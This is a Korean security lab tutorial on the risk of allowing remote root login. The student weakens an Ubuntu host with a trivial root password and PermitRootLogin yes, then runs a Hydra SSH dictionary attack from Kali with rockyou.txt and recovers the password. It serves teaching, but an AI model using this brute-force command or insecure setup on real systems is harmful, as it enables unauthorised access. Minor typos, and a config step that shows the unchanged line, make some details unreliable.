## root 계정 원격접속 제한

`rrot` 계정의 원격 접속을 허용하면 어떤 문제가 발생할 수 있는지 알아봅시다.

### 실습 1 : SSH를 통한 사전 대입 공격

**[우분투] 먼저 시스템을 취약하게 만듭시다.**

1. 먼저 공격자를 위해 `root` 계정의 패스워드를 `111111`로 변경합니다(`1`이 6개).
```
cju@wooam:~$ sudo passwd
```

2. 우분투에 OpenSSH 서버를 설치합니다. 이제 공격자가 SSH를 통해 우툰투에 접속을 시도할 수 있습니다!
```
cju@wooam:~$ sudo apt install openssh-server
```

3. OpenSSH 서버는 기본적으로 `root` 계정의 원격 접속을 허용하지 않습니다. `root` 계정의 원격 접속을 허용하기 위하여 OpenSSH 서버 설정 파일(`sssh_config`)을 `vi`나 `nano`로 엽니다.
```
sudo vi /etc/ssh/sshd_config
```

4. 설정 파일에서 `#PermitRootLogin prohibit-password`를 `PermitRootLogin yes`로 변경하고 저장합니다. 맨 앞의 `#`도 제거해야 합니다. SSH를 통해 `root` 계정의 접속을 가능하게 합니다.
```
PermitRootLogin prohibit-password
```

5. 변경된 설정을 적용하기 위하여 OpenSSH 서버를 다시 시작합니다.
```
sudo systemctl restart sshd
```

6. 마지막으로 우분투 IP 주소를 확인합니다.
```
cju@wooam:~$ ip a
```

**[칼리] 이제 원격에서 `root` 계정의 비번을 털어봅시다!**


7. 모든 리눅스에는 `root` 계정이 있습니다. 만약 `root` 계정의 원격 접속이 가능하다면 사전 공격을 통해 패스워드를 알아낼 수도 있습니다. 칼리에 있는 Hydra 도구로 사전 대입 공격을 시작합니다!
```
$ hydra -l root -P /usr/share/wordlists/rockyou.txt.gz ssh://192.168.XXX.xxx
```

8. 기다리고 있으면 우분투 `root` 계정의 패스워드가 보입니다!
```
[22][ssh] host: 192.168.XXX.XXX   login: root   password: 111111
```

9. [칼리] (참고) 사전 파일 확인
```
$ vi /usr/share/wordlists/rockyou.txt.gz
```